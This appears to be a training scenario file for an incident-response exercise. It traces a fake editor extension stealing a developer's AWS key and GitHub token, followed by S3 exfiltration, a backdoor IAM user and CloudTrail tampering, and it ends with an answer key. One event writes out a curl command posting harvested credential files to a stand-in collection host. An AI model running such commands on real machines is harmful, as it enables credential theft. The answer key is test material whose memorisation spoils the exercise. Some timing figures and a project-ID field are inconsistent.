# ForgeIncident scenario file
# =============================================================================
# ADVANCED TIER (curriculum A2). The developer-workstation-as-front-door
# scenario, and the first bundled scenario to exercise the aws_cloudtrail
# emitter.
#
# What it teaches that nothing else does:
#   - The initial compromise is a LAPTOP, not a server. Nothing internet-
#     facing was exploited. The organization's cloud estate was reached
#     because a developer's machine held long-lived credentials in plain
#     files, which is how a very large share of real cloud breaches begin.
#   - Credentials in ~/.aws/credentials and a GitHub PAT are a single
#     harvest away from each other. Students should notice the attacker
#     took both and used them for different purposes.
#   - CloudTrail tampering as defense evasion, and — more usefully — that
#     the STOP itself is logged. The attacker cannot erase the record of
#     erasing the record.
#   - Long-lived static access keys versus short-lived roles: the whole
#     incident hinges on a key that had been valid for 14 months.
#
# The scenario deliberately has no malware execution on any server. Every
# AWS action is a legitimate, correctly-authenticated API call. What makes
# them malicious is the caller IP, the sequence, and the fact that the
# identity had never previously performed them.
# =============================================================================

scenario_id: stolen-dev-credentials-aws-01
title: "Stolen Developer Credentials to Cloud Data Exfiltration"

description: >
  A backend engineer at Northwind Analytics installs a code-editor extension
  that impersonates a popular formatting plugin. The extension runs a
  post-install script that harvests credential files from the developer's
  home directory — specifically ~/.aws/credentials (a long-lived IAM access
  key, 14 months old) and ~/.config/gh/hosts.yml (a GitHub personal access
  token with full repo scope) — and posts them to an external host.

  Roughly four hours later the attacker begins using the AWS key from an
  external address. They confirm the identity with GetCallerIdentity, list
  the account's S3 buckets, and locate a bucket containing customer
  analytics exports. They download 3.2 GB of it.

  For persistence they create a new IAM user named to blend in with the
  company's service-account convention, attach AdministratorAccess, and mint
  an access key for it. They then attempt to stop the CloudTrail trail to
  blind further monitoring — an action which is itself recorded before
  logging ceases.

  The GitHub token is used separately to clone four private repositories,
  which is visible only as outbound network volume from the developer's
  laptop; no repository-hosting logs were provided.

  Detection came from an AWS billing anomaly alert on egress charges,
  roughly nineteen hours after the key was first abused.

student_briefing: >
  Northwind Analytics received an automated cost-anomaly alert overnight
  for unusual S3 data-transfer charges on their production AWS account.
  The platform team says nobody was running a large export.

  You have three sources covering 11-12 June: AWS CloudTrail for the
  production account, syslog and auth logs from a developer workstation
  (NWA-DEV-041), and firewall traffic logs for the office network.

  Establish what happened, how the actor obtained access, everything they
  did in the AWS account, and whether any data left the environment. Pay
  particular attention to what persists after the immediately obvious
  remediation step, and be explicit about anything the provided evidence
  cannot tell you.

difficulty: advanced
version: "1.0"
seed: 20250611

organization:
  name: Northwind Analytics
  domain: northwindanalytics.example
  industry: Data Analytics
  timezone: UTC
  gcp_project_id: "418205551097"

mitre_tactics:
  - Initial Access
  - Credential Access
  - Discovery
  - Collection
  - Exfiltration
  - Persistence
  - Defense Evasion

learning_objectives:
  - Trace a cloud compromise back to a developer endpoint rather than a server
  - Recognize credential files in a home directory as a high-value target
  - Read AWS CloudTrail and distinguish routine automation from a human attacker
  - Use caller IP and user-agent to separate legitimate API use from abuse
  - Identify IAM user creation with a blend-in name as persistence
  - Recognize that stopping CloudTrail is itself a logged event
  - Explain why rotating the stolen key alone does not evict the attacker
  - Distinguish what the evidence proves from what it only suggests

tags: [cloud, aws, stolen-credentials, developer-workstation, s3, exfiltration, iam-persistence, advanced]

start_time: "2025-06-11T09:00:00Z"

actors:
  developer:
    username: jkessler
    email: jkessler@northwindanalytics.example
    display_name: Joel Kessler
    department: Engineering
    role_title: Backend Engineer
    employee_id: NWA-1188
    is_compromised: true
  ci_service:
    # Legitimate automation. Present so students have a baseline for what
    # normal, high-volume API activity looks like in CloudTrail.
    username: svc-buildrunner
    email: svc-buildrunner@northwindanalytics.example
    display_name: "CI Build Runner (service account)"
    department: Platform
    role_title: Automation Identity
    is_privileged: true
  backdoor_user:
    # Created BY the attacker during the incident. Named to resemble the
    # company's own service-account convention.
    username: svc-metrics-agent
    email: svc-metrics-agent@northwindanalytics.example
    display_name: "svc-metrics-agent (attacker-created)"
    department: "n/a"
    role_title: "Attacker-created IAM user"
    is_privileged: true
  attacker:
    username: unknown
    email: unknown@unattributed.example
    display_name: Unattributed External Actor
    is_compromised: true

hosts:
  devbox:
    hostname: NWA-DEV-041
    ip_address: 10.30.8.41
    host_type: laptop
    os: linux
    os_version: "Ubuntu 24.04 LTS"
    domain_joined: false

timeline:
  # ---- Benign baseline ---------------------------------------------------
  - id: benign-ci-deploy
    at: "+0m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: info
    actor: ci_service
    description: >
      BENIGN. The CI runner's routine morning deployment: uploading build
      artifacts to the deployment bucket. Note the user-agent (aws-sdk-go)
      and the internal NAT address. This is what legitimate automated API
      activity looks like in this account, and it is the baseline the
      attacker's calls should be compared against.
    cloud:
      method_name: PutObject
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::nwa-deploy-artifacts/builds/2025-06-11/api-4412.tar.gz"
      caller_ip: 198.51.100.44
      user_agent: "aws-sdk-go/1.55.5 (go1.22.3; linux; amd64)"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: benign-dev-aws-call
    at: "+18m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: info
    actor: developer
    description: >
      BENIGN, and the most useful baseline event in the scenario. This is
      what Joel's LEGITIMATE AWS usage looks like: a single GetObject
      against the one bucket his service reads from, from the office NAT
      address, using the AWS CLI. Compare it directly against his identity's
      activity later the same afternoon — same user, completely different
      IP, tooling, and API surface. Establishing this baseline is what makes
      the later calls provably anomalous rather than merely suspicious.
    cloud:
      method_name: GetObject
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::nwa-app-config/staging/feature-flags.json"
      caller_ip: 198.51.100.44
      user_agent: "aws-cli/2.17.14 Python/3.11.9 Linux/6.5.0 exe/x86_64"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: benign-dev-work
    at: "+35m"
    event_type: process_created
    log_sources: [linux]
    severity: info
    actor: developer
    host: devbox
    description: >
      BENIGN. Joel running the project's test suite — ordinary development
      work on his own machine.
    process:
      pid: 8812
      ppid: 8140
      name: pytest
      command_line: "pytest tests/ -x --tb=short"
      parent_name: bash

  # ---- Initial access: the malicious extension --------------------------
  - id: extension-install
    at: "+1h12m"
    event_type: malware_download
    log_sources: [linux, palo_alto]
    severity: high
    actor: developer
    host: devbox
    description: >
      Joel installs a code-editor extension that impersonates a widely-used
      formatting plugin. The publisher name differs by two characters from
      the legitimate one. This is the initial access vector, and it is a
      user action rather than an exploit — no vulnerability was involved.
    mitre:
      technique_id: T1195.002
      technique_name: "Supply Chain Compromise: Compromise Software Supply Chain"
      tactic: Initial Access
    file:
      path: /home/jkessler/.vscode/extensions/prettier-formatter-pro-2.4.1/extension.js
      filename: extension.js
      sha256: "7c1e04b8a2d5f93061be47c28a05d7fe3910b642c85ea07d3f19b6c284a05e13"
      size_bytes: 184320
    network:
      protocol: tcp
      src_ip: 10.30.8.41
      src_port: 47712
      dst_ip: 91.219.236.18
      dst_port: 443
      action: allow
      app: ssl
      bytes_sent: 3104
      bytes_received: 189440

  - id: postinstall-script
    at: "+1h12m30s"
    event_type: process_created
    log_sources: [linux]
    severity: critical
    actor: developer
    host: devbox
    description: >
      The extension's post-install hook runs a shell script. Note the parent
      process: a node process spawned by the editor, launching bash. On a
      developer workstation this is not by itself abnormal — which is
      exactly why it is effective — but the commands it goes on to run are.
    mitre:
      technique_id: T1059.004
      technique_name: "Command and Scripting Interpreter: Unix Shell"
      tactic: Execution
    process:
      pid: 9104
      ppid: 8990
      name: bash
      command_line: "/bin/bash /home/jkessler/.vscode/extensions/prettier-formatter-pro-2.4.1/scripts/postinstall.sh"
      parent_name: node
      sha256: "9a3f7d21c6e08b45f912a0dc37e5b8460fa1c2d97e30b654a8f1029c47db3e85"

  - id: harvest-aws-creds
    at: "+1h12m41s"
    event_type: credential_harvested
    log_sources: [linux]
    severity: critical
    actor: developer
    host: devbox
    description: >
      THE CREDENTIAL THEFT (1 of 2). The script reads
      ~/.aws/credentials — a plaintext file containing a long-lived IAM
      access key. Key metadata later confirms this key was created 14 months
      earlier and had never been rotated. Long-lived static keys on
      developer machines are the single most consequential weakness in this
      incident.
    mitre:
      technique_id: T1552.001
      technique_name: "Unsecured Credentials: Credentials In Files"
      tactic: Credential Access
    file:
      path: /home/jkessler/.aws/credentials
      filename: credentials
      sha256: "3e1a9c05f7b2d648e0a31c74b9f2058de4671ac3b920f85d17e4c60a3b9d2f71"
      size_bytes: 217

  - id: harvest-github-token
    at: "+1h12m44s"
    event_type: credential_harvested
    log_sources: [linux]
    severity: critical
    actor: developer
    host: devbox
    description: >
      THE CREDENTIAL THEFT (2 of 2). The GitHub CLI's stored token is read
      from ~/.config/gh/hosts.yml. This token carries full repo scope. It is
      used later for a different purpose than the AWS key, and students
      should track the two credentials separately.
    mitre:
      technique_id: T1552.001
      technique_name: "Unsecured Credentials: Credentials In Files"
      tactic: Credential Access
    file:
      path: /home/jkessler/.config/gh/hosts.yml
      filename: hosts.yml
      sha256: "b84c27e15a03d9f6720e4b18c53d90af6127e3d40b95c8a2f6013de947b25c0a"
      size_bytes: 342

  - id: creds-exfil
    at: "+1h13m2s"
    event_type: data_exfiltration
    log_sources: [linux, palo_alto]
    severity: critical
    actor: developer
    host: devbox
    description: >
      Both credential files are posted to the same host the extension was
      downloaded from. Small payload, but the most damaging few kilobytes in
      the incident. Everything that follows depends on this single request.
    mitre:
      technique_id: T1041
      technique_name: "Exfiltration Over C2 Channel"
      tactic: Exfiltration
    process:
      pid: 9118
      ppid: 9104
      name: curl
      command_line: "curl -s -X POST -d @/tmp/.cache_5512 https://cdn-assets-delivery.example/collect"
      parent_name: bash
    network:
      protocol: tcp
      src_ip: 10.30.8.41
      src_port: 47780
      dst_ip: 91.219.236.18
      dst_port: 443
      action: allow
      app: ssl
      bytes_sent: 1846
      bytes_received: 214

  - id: benign-lunch-build
    at: "+2h40m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: info
    actor: ci_service
    description: >
      BENIGN. Another routine CI deployment, placed between the credential
      theft and the attacker's first use. Students who mark every CloudTrail
      event in the window as malicious will lose precision here.
    cloud:
      method_name: PutObject
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::nwa-deploy-artifacts/builds/2025-06-11/worker-2231.tar.gz"
      caller_ip: 198.51.100.44
      user_agent: "aws-sdk-go/1.55.5 (go1.22.3; linux; amd64)"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  # ---- The GitHub token, used separately ---------------------------------
  - id: repo-cloning
    at: "+4h5m"
    event_type: data_exfiltration
    log_sources: [palo_alto]
    severity: high
    actor: developer
    host: devbox
    description: >
      Sustained outbound HTTPS to a code-hosting provider from the developer
      laptop, 780 MB over eleven minutes, at a time when the machine was
      otherwise idle and Joel was in a meeting. Consistent with bulk cloning
      of private repositories using the stolen token. IMPORTANT: no
      repository-hosting audit log was provided, so this is inference from
      network volume and timing, not proof. A student's report should say
      so and request the GitHub audit log.
    mitre:
      technique_id: T1213.003
      technique_name: "Data from Information Repositories: Code Repositories"
      tactic: Collection
    network:
      protocol: tcp
      src_ip: 10.30.8.41
      src_port: 48022
      dst_ip: 140.82.121.4
      dst_port: 443
      action: allow
      app: ssl
      bytes_sent: 412800
      bytes_received: 817889280

  # ---- AWS: reconnaissance ----------------------------------------------
  - id: aws-whoami
    at: "+5h18m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      FIRST ATTACKER USE OF THE AWS KEY. GetCallerIdentity is the cloud
      equivalent of `whoami` — it is what you run when you have a credential
      and do not yet know what it is. Three things mark this as anomalous:
      the caller IP is external (Joel works from the office NAT or the VPN
      pool), the user-agent is the raw Python SDK rather than the tooling
      Joel normally uses, and Joel had never called this API before.
    mitre:
      technique_id: T1078.004
      technique_name: "Valid Accounts: Cloud Accounts"
      tactic: Initial Access
    cloud:
      method_name: GetCallerIdentity
      service_name: sts.amazonaws.com
      resource_name: "arn:aws:iam::418205551097:user/jkessler"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: aws-list-buckets
    at: "+5h19m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      Account-wide S3 enumeration from the same external address. Joel's
      normal work touches two specific buckets; this call lists every bucket
      in the account.
    mitre:
      technique_id: T1526
      technique_name: "Cloud Service Discovery"
      tactic: Discovery
    cloud:
      method_name: ListBuckets
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::*"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: aws-denied-probe
    at: "+5h21m"
    event_type: cloud_permission_change
    log_sources: [aws_cloudtrail]
    severity: high
    actor: developer
    description: >
      An ACCESS DENIED result. The attacker probes what the key can reach
      and is refused on a secrets-manager call. Failed calls matter: they
      map the boundaries of the compromised identity's permissions, and a
      cluster of denials from one caller is often the clearest signal that
      someone is exploring rather than working.
    mitre:
      technique_id: T1526
      technique_name: "Cloud Service Discovery"
      tactic: Discovery
    cloud:
      method_name: GetSecretValue
      service_name: secretsmanager.amazonaws.com
      resource_name: "arn:aws:secretsmanager:eu-west-1:418205551097:secret:prod/db/master"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "AccessDenied"
      project_id: "418205551097"
      region: eu-west-1

  - id: aws-list-objects
    at: "+5h26m"
    event_type: cloud_api_call
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      Object enumeration inside the customer analytics export bucket — the
      most sensitive data store in the account, and one Joel's role has read
      access to but has never listed in bulk.
    mitre:
      technique_id: T1530
      technique_name: "Data from Cloud Storage Object"
      tactic: Collection
    cloud:
      method_name: ListObjectsV2
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::nwa-customer-exports"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  # ---- Exfiltration ------------------------------------------------------
  - id: aws-s3-exfil
    at: "+5h41m"
    event_type: data_exfiltration
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      THE EXFILTRATION. Bulk retrieval of customer analytics exports —
      3.2 GB across the request series — to the attacker's external
      address. This is the event that generated the cost anomaly which
      eventually triggered detection, roughly thirteen hours later.
    mitre:
      technique_id: T1530
      technique_name: "Data from Cloud Storage Object"
      tactic: Collection
    cloud:
      method_name: GetObject
      service_name: s3.amazonaws.com
      resource_name: "arn:aws:s3:::nwa-customer-exports/2025/Q2/customer_analytics_full.parquet"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1
    file:
      path: "s3://nwa-customer-exports/2025/Q2/customer_analytics_full.parquet"
      filename: customer_analytics_full.parquet
      sha256: "d20f8b471ce93a6528014fb7e0a5d3961c8724be05af13d6928c47e0b153fa8d"
      size_bytes: 3435973836

  # ---- Persistence -------------------------------------------------------
  - id: aws-create-user
    at: "+6h2m"
    event_type: user_created
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      PERSISTENCE (1 of 3). A new IAM user is created, named
      "svc-metrics-agent" to sit alongside the company's genuine
      svc-buildrunner and svc-* accounts. The naming is the point: a casual
      reviewer scanning the IAM user list would not blink at it. Compare it
      against the company's actual service-account inventory to spot that
      nobody requested or provisioned it.
    mitre:
      technique_id: T1136.003
      technique_name: "Create Account: Cloud Account"
      tactic: Persistence
    cloud:
      method_name: CreateUser
      service_name: iam.amazonaws.com
      resource_name: "arn:aws:iam::418205551097:user/svc-metrics-agent"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: aws-attach-admin
    at: "+6h3m"
    event_type: privilege_escalation
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: developer
    description: >
      PERSISTENCE (2 of 3). AdministratorAccess is attached to the new user.
      The compromised developer identity should not have been able to do
      this at all — an over-permissive IAM policy on Joel's account is a
      contributing root cause worth calling out separately from the
      credential theft.
    mitre:
      technique_id: T1098.003
      technique_name: "Account Manipulation: Additional Cloud Roles"
      tactic: Privilege Escalation
    cloud:
      method_name: AttachUserPolicy
      service_name: iam.amazonaws.com
      resource_name: "arn:aws:iam::aws:policy/AdministratorAccess"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  - id: aws-backdoor-key
    at: "+6h4m"
    event_type: cloud_resource_created
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: backdoor_user
    description: >
      PERSISTENCE (3 of 3). An access key is minted for the backdoor user.
      THIS IS THE EVENT THAT MATTERS MOST FOR REMEDIATION: from here the
      attacker no longer needs Joel's stolen key at all. Rotating Joel's
      credential — the obvious first response — would not remove this
      access.
    mitre:
      technique_id: T1098.001
      technique_name: "Account Manipulation: Additional Cloud Credentials"
      tactic: Persistence
    cloud:
      method_name: CreateAccessKey
      service_name: iam.amazonaws.com
      resource_name: "arn:aws:iam::418205551097:user/svc-metrics-agent"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  # ---- Defense evasion ---------------------------------------------------
  - id: aws-stop-trail
    at: "+6h11m"
    event_type: log_cleared
    log_sources: [aws_cloudtrail]
    severity: critical
    actor: backdoor_user
    description: >
      DEFENSE EVASION, and a useful paradox. The attacker stops the
      CloudTrail trail to blind further monitoring — but the StopLogging
      call is itself written to the trail before logging ceases. You cannot
      erase the record of erasing the record. Note also that this call is
      made by the newly-created backdoor user, not Joel's identity, which
      confirms the backdoor was live and in use.
    mitre:
      technique_id: T1562.008
      technique_name: "Impair Defenses: Disable or Modify Cloud Logs"
      tactic: Defense Evasion
    cloud:
      method_name: StopLogging
      service_name: cloudtrail.amazonaws.com
      resource_name: "arn:aws:cloudtrail:eu-west-1:418205551097:trail/nwa-prod-trail"
      caller_ip: 45.132.192.77
      user_agent: "Boto3/1.34.98 Python/3.11.6 Linux/6.5.0"
      status_code: "OK"
      project_id: "418205551097"
      region: eu-west-1

  # ---- Detection ---------------------------------------------------------
  - id: cost-anomaly-alert
    at: "+19h2m"
    event_type: alert_triggered
    log_sources: [aws_cloudtrail]
    severity: critical
    description: >
      Detection, finally: an automated cost-anomaly alert on S3 egress
      charges, roughly thirteen hours after the exfiltration and nineteen
      after the key was first abused. Nothing security-specific detected
      this incident — the finance guardrail did. Worth discussing in the
      debrief alongside the GuardDuty and CloudTrail-insight rules that
      would have caught it far sooner.
    mitre:
      technique_id: T1530
      technique_name: "Data from Cloud Storage Object"
      tactic: Collection

answer_key:
  - id: q1
    question: "How did the attacker obtain valid AWS credentials? Trace it back to the origin."
    answer: >
      Through a malicious code-editor extension installed on the developer
      workstation NWA-DEV-041 at 10:12. Its post-install script (bash spawned
      by node) read ~/.aws/credentials and ~/.config/gh/hosts.yml, then
      posted both to 91.219.236.18 — the same host the extension itself was
      downloaded from. No server was exploited and no vulnerability was
      involved; the entry point was a user installing software.
